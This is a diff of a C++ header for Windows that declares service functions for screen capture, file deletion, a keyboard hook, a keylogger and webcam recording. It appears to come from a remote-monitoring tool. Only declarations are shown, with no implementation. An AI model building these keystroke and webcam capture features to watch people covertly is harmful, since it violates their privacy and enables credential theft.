@@ -16,6 +16,7 @@
 #include <set>
 #include <map>
 #include <filesystem>
+#include <mutex>
 
 struct RunningApp {
     DWORD processID;
@@ -48,10 +49,11 @@ namespace Services {
     bool CaptureScreen(const std::string &filename);
     bool takeScreenShot(const std::string &filename);
 
-    bool copyFile(const std::string &fileSrc, const std::string &fileDes);
+    // bool copyFile(const std::string &fileSrc, const std::string &fileDes);
     bool deleteFile(const std::string &fileName);
 
-    bool SpecialKeys(int S_Key, std::string &logData);
+    bool SpecialKeys(int S_Key);
+    LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
     bool keyLogger(const std::string &saveFile);
 
     bool startWebcam(const std::string &saveFile);
